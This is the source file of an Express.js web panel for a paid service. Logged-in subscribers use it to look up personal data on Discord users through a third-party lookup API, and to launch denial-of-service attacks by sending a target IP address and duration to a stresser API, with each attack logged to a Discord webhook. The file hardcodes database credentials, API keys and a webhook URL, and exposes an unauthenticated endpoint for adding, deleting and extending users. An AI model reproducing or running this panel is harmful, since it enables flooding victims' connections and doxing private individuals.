const express = require('express');
const axios = require('axios');
const path = require('path');
const mysql = require('mysql');
const bcrypt = require('bcrypt');
const helmet = require('helmet');
const session = require('express-session');
const bodyParser = require('body-parser');
const ejs = require('ejs')
const cors = require('cors');
const flash = require('express-flash');
const fs = require('fs');
const csrf = require('csurf');

const app = express();
const port = 8113;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(helmet({
  contentSecurityPolicy: false,
  xXssProtection: true,
}));

app.use(session({
  secret: 'test',
  resave: true,
  saveUninitialized: true,
}));
app.use(flash());


const db = mysql.createConnection({
  host: 'localhost',
  user: 'cordkiller',
  password: '7TZGZNfzMPThGEHD',
  database: 'cordkiller',
});

db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database:', err);
  } else {
    console.log('Connected to MySQL database');
  }
});

app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'views'));

app.get('/login', (req, res) => {
  res.render('login');
});

app.get('/', (req, res) => {
  res.redirect('/login');
});

const isAuthenticated1 = (req, res, next) => {
  if (req.session.loggedIn) {
    return next();
  } else {
    res.status(401).send('Unauthorized');
  }
};

const readBlacklist = () => {
  try {
    const blacklistData = fs.readFileSync('./blacklist.json', 'utf8');
    return JSON.parse(blacklistData);
  } catch (err) {
    console.error('Error reading blacklist:', err);
    return [];
  }
};

app.post('/getData', isAuthenticated1, async (req, res) => {
  const { discordId } = req.body;
  const username = req.session.username;

  const isExemptUser = ['seemo', 'havoc'].includes(username.toLowerCase());

  const blacklist = readBlacklist();
  const isBlacklistedUser = blacklist.includes(discordId);

  if (!isBlacklistedUser && (isExemptUser || (new Date().getTime() - (req.session.lastSearchTimestamp || 0) >= 10000))) {

    req.session.lastSearchTimestamp = new Date().getTime();

    const url = `https://inf0sec.net/api/v1/query?module=discord&q=${discordId}&extensive=true`;

    const config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: url,
      headers: {
        'Authorization': 'Bearer 558a5658-f050-4768-bd04-122ec78ebae7',
      },
    };

    try {
      const response = await axios.request(config);

      const logQuery = 'INSERT INTO search_logs (username, discord_id, is_api_search) VALUES (?, ?, false)';
      await db.query(logQuery, [username, discordId], (err, result) => {
        if (err) {
          console.error('Error executing SQL command:', err);
        } else {
          console.log('SQL command executed successfully:', result);
        }
      });

      res.send(response.data);
    } catch (error) {
      res.send(error);
    }
  } else {

    if (isBlacklistedUser) {
      res.status(403).send('User is blacklisted and cannot perform searches.');
    } else {
      res.status(429).send('Search cooldown period has not elapsed.');
    }
  }
});

app.use(express.json());




app.post('/sendAttack', isAuthenticated1, async (req, res) => {
  const { ipAddress, duration } = req.body;

  if (!ipAddress || !duration) {
    return res.status(400).json({ error: 'IP address and duration are required.' });
  }

  const apiUrl = `https://zopz-api.com/succubus/api?key=Seemoislifetime&host=${ipAddress}&port=80&time=${duration}&method=HOME`;

  const webhookUrl = `https://discord.com/api/webhooks/1194074498052403370/oGTINnD4OGYAjfJWdU-YTXlE6AzRJNUJ-r_U8PLH2AUBNe5YhMmZL40fn8jfa4rE7mOH`;

  try {
    const response = await axios.get(apiUrl);

    if (response.status === 200) {

      const username = req.session.username;


      await axios.post(webhookUrl, {
        embeds: [
          {
            title: 'New Attack Sent',
            color: 0xff0000,
            fields: [
              {
                name: 'IP Address',
                value: ipAddress,
                inline: true,
              },
              {
                name: 'Duration',
                value: duration,
                inline: true,
              },
              {
                name: 'Username',
                value: username,
                inline: true,
              },
              {
                name: 'Attack Method',
                value: 'HomeHolder',
                inline: true,
              },
            ],
          },
        ],
      });

      return res.status(200).json({ message: 'Attack Sent Successfully' });
    } else {
      console.error('Failed to send attack:', response.statusText);
      res.status(response.status).json({ error: 'Failed to send attack.' });
    }
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

const util = require('util');
const dbQuery = util.promisify(db.query).bind(db);

app.get('/api/search', async (req, res) => {
  const { username, apikey, discordid } = req.query;

  if (!username || !apikey || !discordid) {
    return res.status(400).json({ error: 'Username, API key, and Discord ID are required.' });
  }

  try {
    const users = await dbQuery('SELECT * FROM users WHERE username = ? AND apikey = ?', [username, apikey]);

    if (users.length === 0) {
      return res.status(401).json({ error: 'Invalid username or API key.' });
    }

    const url = `https://inf0sec.net/api/v1/query?module=discord&q=${discordid}&extensive=true`;
    const config = {
      method: 'get',
      url: url,
      headers: { 'Authorization': 'Bearer 558a5658-f050-4768-bd04-122ec78ebae7' },
    };

    const response = await axios.request(config);
    res.send(response.data);

    const logApiSearchQuery = 'INSERT INTO search_logs (username, discord_id, is_api_search) VALUES (?, ?, true)';
    await db.query(logApiSearchQuery, [username, discordid], (err, result) => {
      if (err) {
        console.error('Error executing SQL command:', err);
      } else {
        console.log('SQL command executed successfully:', result);
      }
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});



app.get('/api/users', async (req, res) => {
  const action = req.query.action;
  const username = req.query.username;

  if (!username) {
    return res.status(400).json({ error: 'Username is required.' });
  }

  switch (action) {
    case 'deleteuser':
      const username1 = req.query.username;

      if (!username1) {
        return res.status(400).json({ error: 'Username is required.' });
      }

      const deleteQuery = 'DELETE FROM users WHERE username = ?';
      db.query(deleteQuery, [username1], (err, result) => {
        if (err) {
          console.error('Error executing SQL command:', err);
          return res.status(500).json({ error: 'Internal Server Error' });
        }

        if (result.affectedRows === 0) {
          return res.status(404).json({ error: 'User not found.' });
        }

        return res.status(200).json({ message: 'User deleted successfully' });
      });
      break;


      case 'adduser':
        const username = req.query.username;
        const password = req.query.password;
        const expiry = req.query.expiry;
  
        if (!username || !password || !expiry) {
          return res.status(400).json({ error: 'Username, password, and expiry are required.' });
        }
  
        const hashedPassword = await bcrypt.hash(password, 10);
  
        const insertQuery = 'INSERT INTO users (username, password, expiration_date, account_status) VALUES (?, ?, ?, "active")';
        db.query(insertQuery, [username, hashedPassword, expiry], (err, result) => {
          if (err) {
            console.error('Error executing SQL command:', err);
            return res.status(500).json({ error: 'Internal Server Error' });
          }
  
          return res.status(201).json({ message: 'User created successfully', username, expiry });
        });
        break;

    case 'compuser':
      const username2 = req.query.username;
      const days = req.query.days;
      const compensateUserQuery = 'UPDATE users SET expiration_date = DATE_ADD(expiration_date, INTERVAL ? DAY) WHERE username = ?';
      db.query(compensateUserQuery, [days, username2], (err, result) => {
        if (err) {
          console.error('Error executing SQL command:', err);
          return res.status(500).json({ error: 'Internal Server Error' });
        }

        if (result.affectedRows === 0) {
          return res.status(404).json({ error: 'User not found.' });
        }

        return res.status(200).json({ message: `User compensated with ${days} days successfully` });
      });
      break;

    default:
      res.status(400).json({ error: 'Invalid action' });
      break;
  }
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    req.flash('error', 'Username and password are required');
    return res.redirect('/login');
  }

  const query = 'SELECT * FROM users WHERE username = ?';
  db.query(query, [username], (err, results) => {
    if (err) {
      req.flash('error', 'Internal Server Error');
      return res.redirect('/login');
    }

    if (results.length > 0) {
      const user = results[0];

      bcrypt.compare(password, user.password, (bcryptErr, bcryptRes) => {
        if (bcryptErr) {
          req.flash('error', 'Internal Server Error');
          return res.redirect('/login');
        }

        if (bcryptRes) {
          const currentDate = new Date();
          const expirationDate = new Date(user.expiration_date);

          if (currentDate >= expirationDate) {
            req.flash('error', 'Account expired. Please contact support.');
            return res.redirect('/login');
          }

          if (currentDate >= expirationDate && user.account_status !== 'expired') {
            const updateQuery = 'UPDATE users SET account_status = ? WHERE username = ?';
            db.query(updateQuery, ['expired', username], (updateErr) => {
              if (updateErr) {
                console.error('Error updating account status:', updateErr);
              }
            });
          }

          req.session.loggedIn = true;
          req.session.username = username;
          req.session.expirationDate = user.expiration_date;

          setTimeout(() => {
            res.redirect('/dashboard');
          }, 0); 
        } else {
          req.flash('error', 'Invalid username or password');
          res.redirect('/login');
        }
      });
    } else {
      req.flash('error', 'Invalid username or password');
      res.redirect('/login');
    }
  });
});

app.get('/dashboard', (req, res) => {
  const isAuthenticated = (req, res, next) => {
    if (req.session.loggedIn) {
      const username = req.session.username;

      const query = 'SELECT expiration_date FROM users WHERE username = ?';
      db.query(query, [username], (err, results) => {
        if (err) {
          console.error('Error fetching expiration date:', err);
          return res.status(500).send('Internal Server Error');
        }

        if (results.length > 0) {
          const expirationDate = results[0].expiration_date;

          const formattedExpirationDate = expirationDate.toLocaleDateString('en-US', {
            month: 'numeric',
            day: '2-digit',
            year: 'numeric'
          });

          res.locals.username = username;
          res.locals.expirationDate = formattedExpirationDate;

          return next();
        } else {
          return res.status(404).send('User not found');
        }
      });
    } else {
      res.redirect('/login');
    }
  };

  isAuthenticated(req, res, () => {
    const messages = req.flash();

    res.render('dashboard', {
      username: res.locals.username,
      expirationDate: res.locals.expirationDate,
      messages,
    });
  });
});


const isAdmin = (req, res, next) => {
  if (!req.session.loggedIn || !req.session.username) {
    return res.redirect('/login');
  }

  const query = 'SELECT is_admin FROM users WHERE username = ?';
  db.query(query, [req.session.username], (err, results) => {
    if (err) {
      console.error('Database error:', err);
      return res.status(500).send('Internal Server Error');
    }

    if (results.length > 0 && results[0].is_admin) {
      next();
    } else {
      res.redirect("/login")
    }
  });
};

app.get('/adminpooop', isAdmin, async (req, res) => {
  const usersPerPage = 10; // Adjust this to display the desired number of users per page
  const currentPage = parseInt(req.query.page) || 1; // Get the current page from query, default is 1

  try {
    const countQuery = 'SELECT COUNT(*) AS totalUsers FROM users';
    const countResult = await dbQuery(countQuery); // Make sure dbQuery is promisified as earlier
    const totalUsers = countResult[0].totalUsers;
    const totalPages = Math.ceil(totalUsers / usersPerPage);

    const offset = (currentPage - 1) * usersPerPage;
    const query = 'SELECT username, expiration_date, account_status FROM users LIMIT ? OFFSET ?';

    const searchCountQuery = 'SELECT COUNT(*) AS totalSearches FROM search_logs';
    const searchCountResult = await dbQuery(searchCountQuery);
    const totalSearches = searchCountResult[0].totalSearches;

const apiSearchCountQuery = 'SELECT COUNT(*) AS apiSearchCount FROM search_logs WHERE is_api_search = true';
    const apiSearchCountResult = await dbQuery(apiSearchCountQuery);
    const apiSearchCount = apiSearchCountResult[0].apiSearchCount;



    db.query(query, [usersPerPage, offset], (err, results) => {
      if (err) {
        throw err; 
      }
      res.render('adminpoooppp', { users: results, totalPages, currentPage, totalSearches, apiSearchCount });
    });
  } catch (error) {
    console.error('Error on admin page:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});